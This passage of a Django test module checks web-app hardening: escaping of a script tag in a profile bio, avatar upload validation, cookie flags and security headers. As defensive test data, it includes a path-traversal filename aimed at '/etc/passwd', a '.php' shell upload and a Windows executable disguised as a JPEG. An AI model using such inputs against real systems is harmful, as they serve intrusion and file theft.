        # Verify the profile page escapes it inside the bio span
        bio_span = self._get_bio_span()
        self.assertNotIn("<script>", bio_span)
        self.assertIn("&lt;script&gt;", bio_span)


# ── Secure File Upload Tests ──────────────────────────────────────────────────


def _make_file(name, content, content_type="image/jpeg"):
    """Return an InMemoryUploadedFile-compatible file object."""
    from django.core.files.uploadedfile import SimpleUploadedFile
    return SimpleUploadedFile(name, content, content_type=content_type)


# Minimal magic bytes for each allowed format
_JPEG_MAGIC = b"\xff\xd8\xff" + b"\x00" * 100
_PNG_MAGIC = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
_GIF_MAGIC = b"GIF89a" + b"\x00" * 100
_WEBP_MAGIC = b"RIFF\x00\x00\x00\x00WEBP" + b"\x00" * 100


class SecureFileUploadTests(TestCase):
    """
    Tests verifying secure avatar upload validation.

    Design note:
    The insecure baseline accepted any file without checking extension, content,
    or size — an attacker could upload a .php webshell, a disguised executable,
    or a multi-GB file to exhaust disk space.

    The fix enforces:
    1. File size ≤ 2 MB
    2. Extension whitelist: jpg/jpeg/png/gif/webp
    3. Magic-byte verification matching the declared extension
    4. UUID-based filename replacement to prevent path traversal
    """

    def setUp(self):
        self.user = User.objects.create_user(
            username="uploaduser", password="UploadPass1!"
        )
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.upload_url = reverse("uwamahoro_joseline:upload_avatar")
        self.client.login(username="uploaduser", password="UploadPass1!")

    # ── Happy-path uploads ────────────────────────────────────────────────────

    def test_valid_jpeg_upload_accepted(self):
        """A real JPEG with .jpg extension is accepted and saved."""
        f = _make_file("photo.jpg", _JPEG_MAGIC, "image/jpeg")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertRedirects(response, reverse("uwamahoro_joseline:profile"),
                             fetch_redirect_response=False)
        self.profile.refresh_from_db()
        self.assertTrue(bool(self.profile.avatar))

    def test_valid_png_upload_accepted(self):
        """A PNG file with correct magic bytes is accepted."""
        f = _make_file("image.png", _PNG_MAGIC, "image/png")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertRedirects(response, reverse("uwamahoro_joseline:profile"),
                             fetch_redirect_response=False)

    def test_valid_gif_upload_accepted(self):
        """A GIF file with correct magic bytes is accepted."""
        f = _make_file("anim.gif", _GIF_MAGIC, "image/gif")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertRedirects(response, reverse("uwamahoro_joseline:profile"),
                             fetch_redirect_response=False)

    def test_valid_webp_upload_accepted(self):
        """A WebP file with correct magic bytes is accepted."""
        f = _make_file("img.webp", _WEBP_MAGIC, "image/webp")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertRedirects(response, reverse("uwamahoro_joseline:profile"),
                             fetch_redirect_response=False)

    # ── Extension rejection ───────────────────────────────────────────────────

    def test_php_extension_rejected(self):
        """A .php file is rejected even if it contains image bytes."""
        f = _make_file("shell.php", _JPEG_MAGIC, "image/jpeg")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 200)  # re-renders form with error
        avatar_errors = response.context["form"].errors.get("avatar", [])
        self.assertTrue(any("Unsupported file extension '.php'." in e for e in avatar_errors))

    def test_html_extension_rejected(self):
        """A .html phishing page is rejected."""
        f = _make_file("page.html", b"<html>phish</html>", "text/html")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 200)
        avatar_errors = response.context["form"].errors.get("avatar", [])
        self.assertTrue(any("Unsupported file extension '.html'." in e for e in avatar_errors))

    def test_exe_extension_rejected(self):
        """A .exe binary is rejected."""
        f = _make_file("malware.exe", b"MZ" + b"\x00" * 100, "application/octet-stream")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 200)
        avatar_errors = response.context["form"].errors.get("avatar", [])
        self.assertTrue(any("Unsupported file extension '.exe'." in e for e in avatar_errors))

    # ── Magic-byte rejection ──────────────────────────────────────────────────

    def test_disguised_executable_rejected(self):
        """A .jpg file whose content is actually a PE binary is rejected."""
        pe_bytes = b"MZ" + b"\x00" * 100  # Windows PE header
        f = _make_file("evil.jpg", pe_bytes, "image/jpeg")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 200)
        self.assertFormError(response, "form", "avatar",
                             "File content does not match an allowed image format.")

    def test_text_file_with_jpg_extension_rejected(self):
        """Plain text masquerading as .jpg is rejected by magic-byte check."""
        f = _make_file("fake.jpg", b"This is not an image", "image/jpeg")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 200)
        self.assertFormError(response, "form", "avatar",
                             "File content does not match an allowed image format.")

    # ── Size limit ────────────────────────────────────────────────────────────

    def test_oversized_file_rejected(self):
        """A file exceeding 2 MB is rejected before touching disk."""
        oversized = _JPEG_MAGIC + b"\x00" * (2 * 1024 * 1024 + 1)
        f = _make_file("big.jpg", oversized, "image/jpeg")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 200)
        self.assertFormError(response, "form", "avatar",
                             "Avatar file too large (max 2 MB).")

    def test_file_at_size_limit_accepted(self):
        """A file exactly at 2 MB is accepted."""
        # Build content: JPEG magic + padding up to exactly 2 MB
        limit = 2 * 1024 * 1024
        content = _JPEG_MAGIC + b"\x00" * (limit - len(_JPEG_MAGIC))
        f = _make_file("max.jpg", content, "image/jpeg")
        response = self.client.post(self.upload_url, {"avatar": f})
        self.assertRedirects(response, reverse("uwamahoro_joseline:profile"),
                             fetch_redirect_response=False)

    # ── Filename sanitisation ─────────────────────────────────────────────────

    def test_uploaded_filename_replaced_with_uuid(self):
        """The stored filename must be a UUID, not the original user-supplied name."""
        f = _make_file("../../etc/passwd.jpg", _JPEG_MAGIC, "image/jpeg")
        self.client.post(self.upload_url, {"avatar": f})
        self.profile.refresh_from_db()
        stored_name = self.profile.avatar.name.split("/")[-1]
        self.assertRegex(stored_name, r"^[0-9a-f]{32}\.jpg$",
                         "Stored filename should be a hex UUID with .jpg extension")

    # ── Authentication gate ───────────────────────────────────────────────────

    def test_unauthenticated_user_redirected(self):
        """Unauthenticated access to the upload view redirects to login."""
        client = Client()
        f = _make_file("photo.jpg", _JPEG_MAGIC, "image/jpeg")
        response = client.post(self.upload_url, {"avatar": f})
        self.assertEqual(response.status_code, 302)
        self.assertIn("login", response["Location"])

    # ── Audit logging ─────────────────────────────────────────────────────────

    def test_successful_upload_emits_audit_log(self):
        """A valid upload emits an AVATAR_UPLOADED audit record."""
        f = _make_file("photo.jpg", _JPEG_MAGIC, "image/jpeg")
        with self.assertLogs(AUDIT_LOGGER, level="INFO") as log:
            self.client.post(self.upload_url, {"avatar": f})
        self.assertTrue(any("AVATAR_UPLOADED" in m for m in log.output))
        self.assertTrue(any("uploaduser" in m for m in log.output))

    def test_rejected_upload_emits_audit_warning(self):
        """A rejected upload emits an AVATAR_UPLOAD_REJECTED audit warning."""
        f = _make_file("shell.php", _JPEG_MAGIC, "image/jpeg")
        with self.assertLogs(AUDIT_LOGGER, level="WARNING") as log:
            self.client.post(self.upload_url, {"avatar": f})
        self.assertTrue(any("AVATAR_UPLOAD_REJECTED" in m for m in log.output))


# ── Security Settings Tests ───────────────────────────────────────────────────

from django.conf import settings as django_settings  # noqa: E402


class SecuritySettingsTests(TestCase):
    """
    Tests verifying that production-grade security settings are configured.

    Design note:
    Fresh Django projects ship with development defaults that are unsafe in
    production: DEBUG parsed as a truthy string, an empty ALLOWED_HOSTS,
    no cookie hardening, and no security headers.  Each test below asserts
    that the specific fix is in place so regressions are caught immediately.
    """

    # ── DEBUG type ────────────────────────────────────────────────────────────

    def test_debug_is_bool_not_string(self):
        """
        DEBUG must be a Python bool, not a truthy string.

        os.environ.get returns a string; any non-empty string (including the
        literal 'False') evaluates as True.  The settings module must convert
        it to a real bool via an explicit membership test.
        """
        self.assertIsInstance(django_settings.DEBUG, bool,
                              "DEBUG must be bool, not a truthy string from os.environ.get")

    # ── Cookie security ───────────────────────────────────────────────────────

    def test_session_cookie_httponly(self):
        """
        SESSION_COOKIE_HTTPONLY must be True so JavaScript cannot read the
        session token via document.cookie, even when XSS executes.
        """
        self.assertTrue(django_settings.SESSION_COOKIE_HTTPONLY)

    def test_csrf_cookie_httponly(self):
        """CSRF_COOKIE_HTTPONLY must be True (defence in depth alongside SameSite)."""
        self.assertTrue(django_settings.CSRF_COOKIE_HTTPONLY)

    def test_session_cookie_samesite_set(self):
        """
        SESSION_COOKIE_SAMESITE must be set to 'Lax' or 'Strict'.
        A missing SameSite attribute defaults to browser-specific behaviour
        and does not reliably block cross-site form submissions.
        """
        self.assertIn(
            django_settings.SESSION_COOKIE_SAMESITE,
            ('Lax', 'Strict'),
            "SESSION_COOKIE_SAMESITE must be Lax or Strict",
        )

    def test_csrf_cookie_samesite_set(self):
        """CSRF_COOKIE_SAMESITE must be set to 'Lax' or 'Strict'."""
        self.assertIn(
            django_settings.CSRF_COOKIE_SAMESITE,
            ('Lax', 'Strict'),
            "CSRF_COOKIE_SAMESITE must be Lax or Strict",
        )

    # ── Security headers ─────────────────────────────────────────────────────

    def test_content_type_nosniff_enabled(self):
        """
        SECURE_CONTENT_TYPE_NOSNIFF must be True so SecurityMiddleware emits
        X-Content-Type-Options: nosniff on every response.
        Without this, browsers may MIME-sniff uploaded content and execute it.
        """
        self.assertTrue(django_settings.SECURE_CONTENT_TYPE_NOSNIFF)

    def test_x_frame_options_deny(self):
        """
        X_FRAME_OPTIONS must be 'DENY' so XFrameOptionsMiddleware blocks all
        framing — the primary clickjacking defence.
        """
        self.assertEqual(django_settings.X_FRAME_OPTIONS, 'DENY')

    def test_referrer_policy_set(self):
        """
        SECURE_REFERRER_POLICY must be configured so URLs (which may contain
        tokens or IDs in query strings) do not leak to third-party servers
        via the Referer header.
        """
        self.assertIsNotNone(django_settings.SECURE_REFERRER_POLICY)
        self.assertNotEqual(django_settings.SECURE_REFERRER_POLICY, '')

    def test_allowed_hosts_not_empty(self):
        """
        ALLOWED_HOSTS must be a non-empty list.
        An empty list relies on DEBUG=True silently exempting localhost;
        in production every request would be rejected with 400 Bad Request.
        """
        self.assertTrue(
            len(django_settings.ALLOWED_HOSTS) > 0,
            "ALLOWED_HOSTS must not be empty",
        )

    def test_secret_key_is_set(self):
        """SECRET_KEY must be a non-empty string — None makes sessions forgeable."""
        self.assertTrue(
            bool(django_settings.SECRET_KEY),
            "SECRET_KEY must be set and non-empty",
        )

    # ── HTTP response headers ─────────────────────────────────────────────────

    def test_x_content_type_options_header_present(self):
        """
        X-Content-Type-Options: nosniff must appear in every response when
        SECURE_CONTENT_TYPE_NOSNIFF=True and SecurityMiddleware is installed.
        """
        response = self.client.get(reverse("uwamahoro_joseline:login"))
        self.assertEqual(response.get("X-Content-Type-Options"), "nosniff")

    def test_x_frame_options_header_present(self):
        """
        X-Frame-Options: DENY must appear in every response when
        X_FRAME_OPTIONS='DENY' and XFrameOptionsMiddleware is installed.
        """
        response = self.client.get(reverse("uwamahoro_joseline:login"))
        self.assertEqual(response.get("X-Frame-Options"), "DENY")

    def test_referrer_policy_header_present(self):
        """Referrer-Policy header must appear in every response."""
        response = self.client.get(reverse("uwamahoro_joseline:login"))
        self.assertIsNotNone(response.get("Referrer-Policy"),
                             "Referrer-Policy header missing from response")
